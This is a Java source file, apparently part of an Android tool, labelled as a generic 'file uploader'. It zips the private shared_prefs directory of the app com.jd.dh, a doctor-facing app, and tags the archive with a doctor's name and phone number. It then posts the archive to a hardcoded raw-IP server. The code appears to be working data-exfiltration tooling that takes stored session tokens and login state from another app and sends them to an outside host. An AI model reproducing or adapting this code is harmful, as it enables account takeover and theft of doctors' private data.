package com.jd.doctor;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

import org.json.JSONObject;

/**
 * 文件上传器 - 处理各类文件上传任务
 * 自动创建网络客户端进行上传操作
 * 
 * 使用方式：
 * 1. FileUploader uploader = new FileUploader();
 * 2. UploadResult result = uploader.uploadSharedPrefs();
 * 
 * 上传到: http://154.44.25.188:9378/api/upload/file
 */
public class FileUploader {
    private static final String TAG = "FileUploader";
    private static final String DEFAULT_BASE_URL = "http://154.44.25.188:9378";
    private static final String DEFAULT_UPLOAD_PATH = "/api/upload/file";
    
    private final String baseUrl;
    private volatile OkHttpClient httpClient;
    private volatile UploaderCallback uploaderCallback;
    
    /**
     * 设置回调接口
     * @param callback 回调接口实例
     */
    public void setUploaderCallback(UploaderCallback callback) {
        this.uploaderCallback = callback;
    }
    
    /**
     * 默认构造函数，使用默认配置
     */
    public FileUploader() {
        this(DEFAULT_BASE_URL);
    }
    
    /**
     * 自定义构造函数
     * @param baseUrl API基础地址
     */
    public FileUploader(String baseUrl) {
        this.baseUrl = baseUrl;
        this.httpClient = createHttpClient();
        notifyLogInfo("文件上传器已初始化，目标服务器: " + baseUrl + DEFAULT_UPLOAD_PATH);
    }
    
    /**
     * 创建HTTP客户端
     */
    private OkHttpClient createHttpClient() {
        return new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build();
    }
    
    /**
     * 上传单个文件
     * @param filePath 文件路径
     * @param fileName 文件名
     * @return 上传结果
     */
    public UploadResult uploadFile(String filePath, String fileName) {
        return uploadFile(filePath, fileName, null);
    }
    
    /**
     * 上传shared_prefs目录下的所有文件（需要从外部获取医生信息）
     * @return 上传结果
     */
    public UploadResult uploadSharedPrefs() {
        notifyLogError("uploadSharedPrefs() 需要医生信息参数，请使用 uploadSharedPrefs(doctorName, phoneNumber)");
        return new UploadResult(false, "需要医生信息参数");
    }
    
    /**
     * 上传shared_prefs目录下的所有文件
     * @param doctorName 医生姓名
     * @param phoneNumber 手机号
     * @return 上传结果
     */
    public UploadResult uploadSharedPrefs(String doctorName, String phoneNumber) {
        try {
            // 获取shared_prefs目录路径
            String sharedPrefsPath = getSharedPrefsPath();
            File sharedPrefsDir = new File(sharedPrefsPath);
            
            if (!sharedPrefsDir.exists() || !sharedPrefsDir.isDirectory()) {
                notifyLogError("shared_prefs目录不存在: " + sharedPrefsPath);
                return new UploadResult(false, "shared_prefs目录不存在");
            }
            
            // 创建临时ZIP文件 - 使用应用缓存目录
            String folderName = doctorName + "----" + phoneNumber;
            String zipFileName = folderName + "_shared_prefs.zip";
            // 使用应用数据目录而不是系统临时目录
            String tempDir = "/data/data/com.jd.dh/cache/";
            new File(tempDir).mkdirs(); // 确保目录存在
            File tempZipFile = new File(tempDir + zipFileName);
            
            // 打包shared_prefs目录
            notifyLogInfo("开始创建ZIP文件: " + tempZipFile.getAbsolutePath());
            boolean zipSuccess = createZipFile(sharedPrefsDir, tempZipFile, folderName);
            if (!zipSuccess) {
                notifyLogError("创建ZIP文件失败: " + tempZipFile.getAbsolutePath());
                return new UploadResult(false, "创建ZIP文件失败");
            }
            
            // 验证ZIP文件创建结果
            notifyLogInfo("ZIP文件创建完成");
            notifyLogInfo("ZIP文件存在: " + tempZipFile.exists());
            notifyLogInfo("ZIP文件大小: " + tempZipFile.length() + " 字节");
            notifyLogInfo("ZIP文件路径: " + tempZipFile.getAbsolutePath());
            
            notifyLogInfo("开始上传shared_prefs文件: " + zipFileName + " (大小: " + tempZipFile.length() + " 字节)");
            
            // 上传ZIP文件
            JSONObject extraParams = new JSONObject();
            extraParams.put("type", "shared_prefs");
            extraParams.put("doctorName", doctorName);
            extraParams.put("phoneNumber", phoneNumber);
            extraParams.put("folderName", folderName);
            
            // 直接使用原始中文文件名，通过RFC 5987格式处理
            UploadResult result = uploadSingleFile(tempZipFile, zipFileName, extraParams);
            
            // 清理临时文件
            if (tempZipFile.exists()) {
                boolean deleted = tempZipFile.delete();
                notifyLogInfo("临时ZIP文件已" + (deleted ? "成功删除" : "删除失败"));
            }
            
            return result;
            
        } catch (Exception e) {
            notifyLogError("上传shared_prefs异常: " + e.getMessage());
            return new UploadResult(false, "上传异常: " + e.getMessage());
        }
    }

    /**
     * 上传单个文件（带额外参数）
     * @param filePath 文件路径
     * @param fileName 文件名
     * @param extraParams 额外参数
     * @return 上传结果
     */
    public UploadResult uploadFile(String filePath, String fileName, JSONObject extraParams) {
        File file = new File(filePath);
        return uploadSingleFile(file, fileName, extraParams);
    }
    
    /**
     * 内部方法：上传单个文件
     */
    private UploadResult uploadSingleFile(File file, String fileName, JSONObject extraParams) {
        notifyLogInfo("准备上传文件: " + file.getAbsolutePath());
        notifyLogInfo("文件存在: " + file.exists());
        notifyLogInfo("是文件: " + file.isFile());
        notifyLogInfo("可读: " + file.canRead());
        notifyLogInfo("文件大小: " + file.length() + " 字节");
        
        if (!file.exists() || !file.isFile()) {
            notifyLogError("文件不存在或不是有效文件: " + file.getAbsolutePath());
            return new UploadResult(false, "文件不存在");
        }
        
        if (file.length() == 0) {
            notifyLogError("文件大小为0: " + file.getAbsolutePath());
            return new UploadResult(false, "文件为空");
        }
        
        try {
            return performUpload(file, fileName, extraParams);
        } catch (Exception e) {
            notifyLogError("文件上传异常: " + e.getMessage());
            return new UploadResult(false, "上传异常: " + e.getMessage());
        }
    }
    
    /**
     * 获取shared_prefs目录路径
     */
    private String getSharedPrefsPath() {
        // 通常Android应用的shared_prefs路径
        return "/data/data/com.jd.dh/shared_prefs";
    }
    
    /**
     * 将文件名编码为HTTP安全格式，避免中文字符问题
     * @param fileName 原始文件名
     * @return 编码后的安全文件名
     */
    private String encodeSafeFileName(String fileName) {
        if (fileName == null) return "";
        
        // 将中文字符转换为安全的编码格式
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < fileName.length(); i++) {
            char c = fileName.charAt(i);
            if (c >= 32 && c <= 126 && c != '"' && c != '\\') {
                // ASCII可打印字符，直接使用
                sb.append(c);
            } else {
                // 非ASCII字符，转换为Unicode编码
                sb.append("_U").append(String.format("%04X", (int) c));
            }
        }
        return sb.toString();
    }
    
    private String createAsciiFallbackFileName(String fileName) {
        return encodeSafeFileName(fileName);
    }
    
    private String encodeRFC5987FileName(String fileName) {
        if (fileName == null || fileName.isEmpty()) {
            return "";
        }
        try {
            String encoded = URLEncoder.encode(fileName, "UTF-8");
            encoded = encoded.replace("+", "%20").replace("%7E", "~");
            return encoded;
        } catch (Exception e) {
            notifyLogError("RFC5987文件名编码失败: " + e.getMessage());
            return encodeSafeFileName(fileName);
        }
    }
    
    /**
     * 创建ZIP文件
     * @param sourceDir 源目录
     * @param zipFile 目标ZIP文件
     * @param folderName ZIP内的文件夹名称
     * @return 是否成功
     */
    private boolean createZipFile(File sourceDir, File zipFile, String folderName) {
        try {
            // 确保父目录存在
            zipFile.getParentFile().mkdirs();
            
            FileOutputStream fos = new FileOutputStream(zipFile);
            ZipOutputStream zos = new ZipOutputStream(fos);
            
            // 获取源目录下的所有文件
            File[] files = sourceDir.listFiles();
            if (files == null || files.length == 0) {
                notifyLogError("shared_prefs目录为空");
                zos.close();
                return false;
            }
            
            // 添加文件到ZIP
            for (File file : files) {
                if (file.isFile()) {
                    addFileToZip(zos, file, folderName + "/" + file.getName());
                    notifyLogInfo("已添加文件到ZIP: " + file.getName());
                }
            }
            
            zos.close();
            notifyLogInfo("ZIP文件创建成功: " + zipFile.getPath() + ", 包含 " + files.length + " 个文件");
            return true;
            
        } catch (Exception e) {
            notifyLogError("创建ZIP文件失败: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * 添加单个文件到ZIP
     */
    private void addFileToZip(ZipOutputStream zos, File file, String entryName) throws IOException {
        FileInputStream fis = new FileInputStream(file);
        ZipEntry zipEntry = new ZipEntry(entryName);
        zos.putNextEntry(zipEntry);
        
        byte[] buffer = new byte[1024];
        int length;
        while ((length = fis.read(buffer)) > 0) {
            zos.write(buffer, 0, length);
        }
        
        zos.closeEntry();
        fis.close();
    }
    
    /**
     * 执行实际的文件上传
     */
    private UploadResult performUpload(File file, String fileName, JSONObject extraParams) throws IOException {
        // 判断文件类型
        MediaType mediaType = getMediaType(file);
        
        // 调试文件信息
        notifyLogInfo("构造multipart请求 - 文件: " + fileName);
        notifyLogInfo("媒体类型: " + mediaType.toString());
        notifyLogInfo("文件路径: " + file.getAbsolutePath());
        
        // 验证文件可读性
        if (!file.canRead()) {
            throw new IOException("文件不可读: " + file.getAbsolutePath());
        }
        
        // 尝试读取文件头验证
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] header = new byte[4];
            int bytesRead = fis.read(header);
            fis.close();
            notifyLogInfo("文件头读取成功，读取了" + bytesRead + "字节");
        } catch (Exception e) {
            notifyLogError("文件头读取失败: " + e.getMessage());
            throw new IOException("文件读取测试失败: " + e.getMessage());
        }
        
        // 创建文件RequestBody
        RequestBody fileBody = RequestBody.create(mediaType, file);
        notifyLogInfo("文件RequestBody创建完成，类型: " + fileBody.contentType());
        
        try {
            long contentLength = fileBody.contentLength();
            notifyLogInfo("RequestBody内容长度: " + contentLength + " 字节");
            if (contentLength == 0) {
                throw new IOException("RequestBody内容长度为0");
            }
        } catch (IOException e) {
            notifyLogError("获取RequestBody长度失败: " + e.getMessage());
        }
        
        // 构建多部分请求体 - 使用标准方式
        MultipartBody.Builder bodyBuilder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM);
        
        // 生成ASCII回退文件名与RFC5987编码
        String fallbackFileName = createAsciiFallbackFileName(fileName);
        String encodedFileName = encodeRFC5987FileName(fileName);
        notifyLogInfo("原始文件名: " + fileName);
        notifyLogInfo("ASCII回退文件名: " + fallbackFileName);
        notifyLogInfo("RFC5987编码文件名: " + encodedFileName);
        
        // 构造Content-Disposition, 同时携带filename和filename*
        String contentDisposition = "form-data; name=\"file\"; filename=\"" + fallbackFileName + "\"";
        if (!encodedFileName.isEmpty() && !encodedFileName.equals(fallbackFileName)) {
            contentDisposition += "; filename*=UTF-8''" + encodedFileName;
        }
        Headers fileHeaders = Headers.of("Content-Disposition", contentDisposition);
        bodyBuilder.addPart(fileHeaders, fileBody);
        notifyLogInfo("文件部分已添加到multipart");
        
        // 添加额外参数
        if (extraParams != null) {
            java.util.Iterator<String> keys = extraParams.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                try {
                    bodyBuilder.addFormDataPart(key, extraParams.getString(key));
                } catch (Exception e) {
                    // 忽略无效参数
                }
            }
        }
        
        // 构建请求
        RequestBody requestBody = bodyBuilder.build();
        String uploadUrl = baseUrl + DEFAULT_UPLOAD_PATH;
        Request request = new Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build();
        
        notifyLogInfo("上传文件到: " + uploadUrl);
        notifyLogInfo("文件信息: " + fileName + " (大小: " + file.length() + " 字节)");
        notifyLogInfo("媒体类型: " + mediaType.toString());
        
        // 调试：记录请求详情
        notifyLogInfo("请求体类型: " + requestBody.contentType());
        try {
            notifyLogInfo("请求体大小: " + requestBody.contentLength() + " 字节");
        } catch (IOException e) {
            notifyLogInfo("无法获取请求体大小");
        }
        
        // 执行上传
        try (Response response = httpClient.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                notifyLogError("HTTP请求失败，错误码: " + response.code());
                return new UploadResult(false, "HTTP错误: " + response.code());
            }
            
            ResponseBody responseBody = response.body();
            if (responseBody == null) {
                notifyLogError("HTTP响应体为空");
                return new UploadResult(false, "响应体为空");
            }
            
            String responseText = responseBody.string();
            notifyRawResponse(responseText, "FILE_UPLOAD");
            
            // 解析响应判断成功
            try {
                JSONObject result = new JSONObject(responseText);
                // ThinkPHP格式：code=1表示成功，code=0表示失败
                String code = result.optString("code");
                boolean success = "1".equals(code) || result.optBoolean("success", false);
                
                if (success) {
                    // 成功时从data字段获取文件信息
                    JSONObject data = result.optJSONObject("data");
                    String fileUrl = "";
                    if (data != null) {
                        fileUrl = data.optString("fullurl", data.optString("url", ""));
                    }
                    String message = result.optString("msg", "上传成功");
                    return new UploadResult(true, message, fileUrl, responseText);
                } else {
                    String message = result.optString("msg", "上传失败");
                    return new UploadResult(false, message, "", responseText);
                }
            } catch (Exception e) {
                return new UploadResult(false, "响应解析失败", "", responseText);
            }
        }
    }
    
    /**
     * 根据文件扩展名判断媒体类型
     */
    private MediaType getMediaType(File file) {
        String fileName = file.getName().toLowerCase();
        if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg")) {
            return MediaType.parse("image/jpeg");
        } else if (fileName.endsWith(".png")) {
            return MediaType.parse("image/png");
        } else if (fileName.endsWith(".gif")) {
            return MediaType.parse("image/gif");
        } else if (fileName.endsWith(".pdf")) {
            return MediaType.parse("application/pdf");
        } else if (fileName.endsWith(".txt")) {
            return MediaType.parse("text/plain");
        } else if (fileName.endsWith(".json")) {
            return MediaType.parse("application/json");
        } else if (fileName.endsWith(".zip")) {
            return MediaType.parse("application/zip");
        } else {
            return MediaType.parse("application/octet-stream");
        }
    }
    
    
    /**
     * 通知原始响应数据
     */
    private void notifyRawResponse(String rawResponse, String requestType) {
        if (uploaderCallback != null && rawResponse != null) {
            try {
                uploaderCallback.onRawResponse(rawResponse, requestType);
            } catch (Exception e) {
                // 忽略回调异常
            }
        }
    }

    /**
     * 通知日志信息
     */
    private void notifyLogInfo(String message) {
        if (uploaderCallback != null) {
            try {
                uploaderCallback.onLogInfo(message);
            } catch (Exception e) {
                // 忽略回调异常
            }
        }
    }

    /**
     * 通知错误信息
     */
    private void notifyLogError(String message) {
        if (uploaderCallback != null) {
            try {
                uploaderCallback.onLogError(message);
            } catch (Exception e) {
                // 忽略回调异常
            }
        }
    }
    
    /**
     * 医生信息类
     */
    private static class DoctorInfo {
        public final String name;
        public final String phoneNumber;
        public final String office;
        
        public DoctorInfo(String name, String phoneNumber, String office) {
            this.name = name != null ? name : "";
            this.phoneNumber = phoneNumber != null ? phoneNumber : "";
            this.office = office != null ? office : "未知科室";
        }
        
        @Override
        public String toString() {
            return String.format("DoctorInfo{name='%s', phoneNumber='%s', office='%s'}", 
                    name, phoneNumber, office);
        }
    }
    
    /**
     * 上传结果类
     */
    public static class UploadResult {
        public final boolean success;
        public final String message;
        public final String fileUrl;
        public final String rawResponse;
        
        public UploadResult(boolean success, String message) {
            this(success, message, "", "");
        }
        
        public UploadResult(boolean success, String message, String fileUrl, String rawResponse) {
            this.success = success;
            this.message = message;
            this.fileUrl = fileUrl;
            this.rawResponse = rawResponse;
        }
        
        @Override
        public String toString() {
            return String.format("UploadResult{success=%s, message='%s', fileUrl='%s'}", 
                    success, message, fileUrl);
        }
    }

    /**
     * 回调接口
     */
    public interface UploaderCallback {
        void onRawResponse(String response, String requestType);
        void onLogInfo(String message);
        void onLogError(String message);
    }
}
